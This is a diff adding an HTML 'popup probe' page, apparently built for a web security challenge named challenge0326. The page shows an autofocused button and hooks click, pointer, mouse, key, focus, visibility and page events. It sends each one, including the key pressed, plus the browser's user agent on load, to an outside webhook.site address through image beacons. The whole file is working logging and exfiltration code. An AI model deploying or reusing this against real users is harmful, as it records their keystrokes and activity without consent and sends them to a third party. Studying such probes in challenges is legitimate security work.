@@ -1,0 +1,59 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>challenge0326 popup probe</title>
+<style>
+body {
+  font-family: sans-serif;
+  margin: 0;
+  min-height: 100vh;
+  display: grid;
+  place-items: center;
+  background: #f4f4f4;
+}
+
+button {
+  font-size: 28px;
+  padding: 24px 40px;
+}
+</style>
+<body>
+  <button autofocus id="probe">Probe Button</button>
+</body>
+<script>
+const sink = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+
+function ping(msg) {
+  const i = new Image();
+  i.src = sink + '?m=' + encodeURIComponent(msg) + '&t=' + Date.now();
+}
+
+[
+  'click',
+  'dblclick',
+  'pointerdown',
+  'pointerup',
+  'mousedown',
+  'mouseup',
+  'keydown',
+  'keyup',
+  'focus',
+  'blur',
+  'visibilitychange',
+  'pagehide',
+  'pageshow'
+].forEach(type => {
+  addEventListener(type, event => {
+    let extra = '';
+    if (type === 'visibilitychange') {
+      extra = ':' + document.visibilityState;
+    } else if (type.startsWith('key')) {
+      extra = ':' + event.key;
+    } else if (event.target && event.target.tagName) {
+      extra = ':' + event.target.tagName;
+    }
+    ping('popup:' + type + extra);
+  }, true);
+});
+
+ping('popup:boot:' + navigator.userAgent);
+</script>
